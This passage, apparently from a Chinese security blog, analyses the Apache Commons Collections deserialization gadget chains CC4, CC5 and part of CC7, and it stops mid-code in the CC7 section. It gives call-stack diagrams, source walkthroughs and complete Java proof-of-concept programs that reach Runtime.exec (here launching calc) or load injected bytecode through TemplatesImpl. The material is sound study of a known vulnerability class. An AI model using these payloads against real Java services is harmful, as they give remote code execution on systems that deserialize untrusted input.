class="line"><span class="comment">//        setFieldValue(queue,&quot;queue&quot;,new Object[]&#123;obj,1&#125;);</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj,<span class="number">1</span>&#125;);</span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC4链"><a href="#CC4链" class="headerlink" title="CC4链"></a>CC4链</h2><h3 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h3><p>jdk8u65，cc4</p><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>前面已经分析过了cc2链和cc3链，这个其实就是结合了一下。利用PriorityQueue和TransformingComparator去触发TemplatesImpl加载任意类。</p><p>Gadget Chain：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getTransletInstancePriorityQueue.readObject-&gt;</span><br><span class="line">PriorityQueue.heapify-&gt;</span><br><span class="line">PriorityQueue.siftDown-&gt;</span><br><span class="line">PriorityQueue.siftDownUsingComparator-&gt;</span><br><span class="line">TransformingComparator.compare-&gt;</span><br><span class="line">ChainedTransformer.transform-&gt;</span><br><span class="line">TrAXFilter(构造方法)-&gt;</span><br><span class="line">TemplatesImpl.newTransformer-&gt;</span><br><span class="line">TemplatesImpl.getTransletInstance-&gt;</span><br><span class="line">TemplatesImpl.defineTransletClasses-&gt;</span><br><span class="line">(动态创建的类)cc4.newInstance()-&gt;</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>还是利用cc2一直调用到transformer的地方，不过这里的transformer换成了之前cc3里面的chainedtransformer。</p><p>所以我们只需要做一个替换就行了。</p><h3 id="Poc-4"><a href="#Poc-4" class="headerlink" title="Poc"></a>Poc</h3><p>直接贴poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> GenerateClassBase.getEncodedClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(encoded);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Mash1r0&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj,<span class="number">1</span>&#125;);</span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC5链"><a href="#CC5链" class="headerlink" title="CC5链"></a>CC5链</h2><h3 id="前置-3"><a href="#前置-3" class="headerlink" title="前置"></a>前置</h3><p>环境：jdk8u65、cc4</p><p>这条链还是与cc1有点关系，不过用到了一个新的类BadAttributeValueExpException。它是 Java javax.management包中的一个异常类，它主要用于 JMX（Java Management Extensions）框架中。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210944444.png" alt="img"></p><p>在ysoserial里面有一句话说需要没有security manager。</p><p>SecurityManager（安全管理器）是 Java 提供的一种安全机制，用于限制 Java 应用程序的操作权限，防止恶意代码执行危险操作，默认情况下是关闭状态。</p><p>Gadget Chain：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">      ObjectInputStream.readObject()</span><br><span class="line">          BadAttributeValueExpException.readObject()</span><br><span class="line">              TiedMapEntry.toString()</span><br><span class="line">                  LazyMap.get()</span><br><span class="line">                      ChainedTransformer.transform()</span><br><span class="line">                          ConstantTransformer.transform()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Class.getMethod()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Runtime.getRuntime()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>这个链子的后半部分还是cc1的LazyMap，我们直接从LazyMap接着分析。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210945689.png" alt="img"></p><p>回到LazyMap的get方法，调用了transform，我们接着去找get。</p><p>根据调用链可以知道，这里还是用的cc6里面的TiedMapEntry。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210945150.png" alt="img"></p><p>还是这个getValue。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210945555.png" alt="img"></p><p>继续往后跟。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210945484.png" alt="img"></p><p>在之前我们这里用的是hashCode方法，这次我们去看toString。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210945566.png" alt="img"></p><p>然后继续往后找，这里toString的用法也应该会很多，我们直接根据链子中的类定位一下。</p><p>javax.management.BadAttributeValueExpException</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210945639.png" alt="img"></p><p>这个类刚好在readObject里面调用了它，我们也就不用继续往后找了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210945608.png" alt="img"></p><p>从前面分析过来，只有readObject里面有一些判断，所以我们直接分析如何走到valObj.toString就行了，valObj则传入我们的TiedMapEntry实例。</p><p>只有当valObj不是toString，且System.getSecurityManager() &#x3D;&#x3D; null，或者是valObj为if中的基本类型的话就会触发到toString，所以我们在前面说明了需要没有security manager，然后其他全是或，我们有一个true就行了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>这里意思是将BadAttributeValueExpException的val字段赋值给valObj，所以我们要看的是val。</p><p>BadAttributeValueExpException的构造器是一个public，并且可以直接给val赋值。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210945687.png" alt="img"></p><p>但是可以发现，这里就已经调用了toString，所以我们不能在实例化的时候给val进行赋值，不然会提前触发。这个val是一个私有的。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210945191.png" alt="img"></p><h3 id="Poc-5"><a href="#Poc-5" class="headerlink" title="Poc"></a>Poc</h3><p>我们利用反射即可，接下来构造POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.lazyMap(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">serialize</span> <span class="operator">=</span> serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(serialize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> poc;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String exp)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC7链"><a href="#CC7链" class="headerlink" title="CC7链"></a>CC7链</h2><h3 id="前置-4"><a href="#前置-4" class="headerlink" title="前置"></a>前置</h3><p>环境：jdk8u65、cc4+cc3.1（懒得改了，反正两个命名空间不冲突）</p><p>这条链主要还是cc1里面的LazyMap一部分，用了新的Hashtable。</p><p>注意这里有两个类不算是新的类，而是子类没有方法去调用了父类的方法。</p><p>Gadget Chain：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">java.lang.Runtime.exec</span><br></pre></td></tr></table></figure><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>还是从LazyMap的get方法开始。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210947175.png" alt="img"></p><p>寻找get的用法，根据链子我们可以找到对应的java.util.AbstractMap（这其实是HashMap的父类）。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210947475.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210947248.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210947577.png" alt="img"></p><p>好像还有点复杂，我们先继续往后面走。这个equals的用法应该也挺多的。</p><p>定位到org.apache.commons.collections.map.AbstractMapDecorator.equals。</p><p>我这里直接查找用法没找到，注意一下这个类是LazyMap的父类。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210947936.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210947438.png" alt="img"></p><p>手动去看了一下，接着继续往后找java.util.Hashtable。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210947851.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210947416.png" alt="img"></p><p>实现有点复杂，需要注意我们调用的是谁的方法以及传参。</p><p>其实到这也有点疑问，都是equals，为什么在前面不直接去找Hashtable的equals用法。</p><p>我们先接着往后走，后面分析的时候再来看看为什么。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210948521.png" alt="img"></p><p>最后能在Hashtable的readObject里面找到reconstitutionPut。</p><p>整个链子的流程我们就找完了，接下来就是去让链子各个步骤能够正常进行。</p><p>先从readObject开始分析，这里主要是for循环能够走进去就行了，也就是需要element&gt;0。</p><p>它代表反序列化对象中的键值对数量，我们后续是要将LazyMap的实例作为key传进来的。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210948677.png" alt="img"></p><p>前面分析过，是要去调用到equals，这里就是做了一个key的判断，主要的地方就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key))</span><br></pre></td></tr></table></figure><p>第一个判断的作用是检查当前哈希表中的某个 Entry（e）的哈希值是否与新插入的 key 的哈希值相同，同时又判断了两者的key是否相同。</p><p>在 Java 中，&amp;&amp;（逻辑与）是 短路运算符（short-circuit operator），当 &amp;&amp; 左侧的表达式为 false 时，右侧的表达式不会执行。</p><p>这里就涉及到了hash碰撞的问题了，因为如果我们第一个不同的话，那么就直接出if了，不会调用到后面的equals。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210948523.png" alt="img"></p><p>首先我们要知道Map 的 hashCode() 是基于它的 键值对 计算的，而不是对象本身的内存地址。</p><p>我们先来尝试找两个hash相同，但是值不一样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashCrack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;Aa&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="string">&quot;BB&quot;</span>;</span><br><span class="line">        System.out.println(a.hashCode());</span><br><span class="line">        System.out.println(b.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的Aa和BB其实就可以了，最后会得到两个2112的结果。</p><p>可以用以下代码做个试验：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> 